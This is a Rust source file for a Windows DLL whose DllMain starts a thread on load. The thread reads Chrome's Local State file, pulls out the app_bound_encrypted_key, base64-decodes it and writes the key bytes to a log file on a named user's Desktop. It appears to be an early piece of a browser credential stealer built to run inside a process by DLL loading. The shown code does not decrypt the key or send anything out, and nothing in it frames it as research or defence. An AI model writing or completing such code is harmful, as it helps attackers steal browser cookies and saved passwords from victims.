use serde::Deserialize;
use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use base64::{Engine as _, engine::general_purpose};

#[derive(Deserialize)]
struct OsCrypt {
    app_bound_encrypted_key: String,
}

#[derive(Deserialize)]
struct LocalState {
    os_crypt: OsCrypt,
}

fn simple_log(message: &str) {
    let desktop_path = "C:\\Users\\Kemal\\Desktop\\log.txt";
    let file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(desktop_path);

    if let Ok(mut file) = file {
        let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        let _ = writeln!(file, "[{}] {}", timestamp, message);
    }
}

fn extract_and_log() {
    simple_log("Starting extraction process...");

    let local_state_path = "C:\\Users\\Kemal\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    simple_log(&format!("Attempting to read Local State from: {}", local_state_path));

    let mut file = match File::open(local_state_path) {
        Ok(f) => f,
        Err(e) => {
            simple_log(&format!("Error opening Local State: {}", e));
            return;
        }
    };

    let mut content = String::new();
    if let Err(e) = file.read_to_string(&mut content) {
        simple_log(&format!("Error reading Local State: {}", e));
        return;
    }

    let local_state: LocalState = match serde_json::from_str(&content) {
        Ok(ls) => ls,
        Err(e) => {
            simple_log(&format!("Error parsing JSON: {}", e));
            return;
        }
    };

    let encrypted_key = &local_state.os_crypt.app_bound_encrypted_key;
    simple_log("Found app_bound_encrypted_key in JSON.");

    match general_purpose::STANDARD.decode(encrypted_key) {
        Ok(decoded) => {
            simple_log("Successfully decoded Base64 key.");
            simple_log(&format!("Decoded key (hex): {:02x?}", decoded));
            simple_log(&format!("Decoded key (raw bytes): {:?}", decoded));
        }
        Err(e) => {
            simple_log(&format!("Error decoding Base64: {}", e));
        }
    }

    simple_log("Extraction process completed.");
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
pub unsafe extern "system" fn DllMain(
    hinst_dll: *mut std::ffi::c_void,
    fdw_reason: u32,
    lpv_reserved: *mut std::ffi::c_void,
) -> i32 {
    if fdw_reason == 1 { // DLL_PROCESS_ATTACH
        use windows_sys::Win32::System::Threading::CreateThread;

        unsafe extern "system" fn thread_proc(lp_parameter: *mut std::ffi::c_void) -> u32 {
            extract_and_log();
            0
        }

        CreateThread(
            std::ptr::null(),
            0,
            Some(thread_proc),
            std::ptr::null(),
            0,
            std::ptr::null_mut(),
        );
    }
    1 // TRUE
}
